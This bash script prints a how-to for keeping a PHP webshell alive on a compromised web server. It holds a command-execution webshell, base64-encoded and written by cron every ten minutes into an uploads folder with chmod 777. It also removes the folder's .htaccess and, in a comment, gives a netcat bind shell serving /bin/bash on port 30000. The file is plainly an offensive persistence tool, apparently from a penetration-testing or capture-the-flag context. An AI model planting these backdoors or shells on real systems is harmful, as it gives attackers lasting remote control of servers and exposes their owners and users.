#!/bin/bash

# Through Webshell - nc.traditional -lvp 30000 -e /bin/bash &

printf "Commands you need to execute to schedule the webshell\n"
printf "\n"

PHP='<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>'
printf "Create php webshell\n"
printf "PHP - $PHP\n\n"
WEBSHELL=`echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>' | base64 -w 0`
printf "Base64 encoded Webshell - $WEBSHELL\n"
printf "\n"
printf "Pull the existing crontab\n"
printf "crontab -l > mycron\n\n"
printf "Append to the file mycron\n"
printf "echo \"*/10 * * * * echo $WEBSHELL | base64 -d > /var/www/html/uploads/attachments/attach.php\" >> mycron\n\n"
printf "Setup permissions on php file for execution\n"
printf "echo \"*/10 * * * * chmod 777 /var/www/html/uploads/attachments/attach.php\" >> mycron\n\n"
printf "Load the mycron as the current crontab for www-data\n"
printf "crontab mycron\n\n"
printf "Verify the crontab listing has your php\n"
printf "crontab -l\n\n"
printf "Notice a .htaccess file exists - Remove the file\n"
printf "rm /var/www/html/uploads/attachments/.htaccess\n\n"

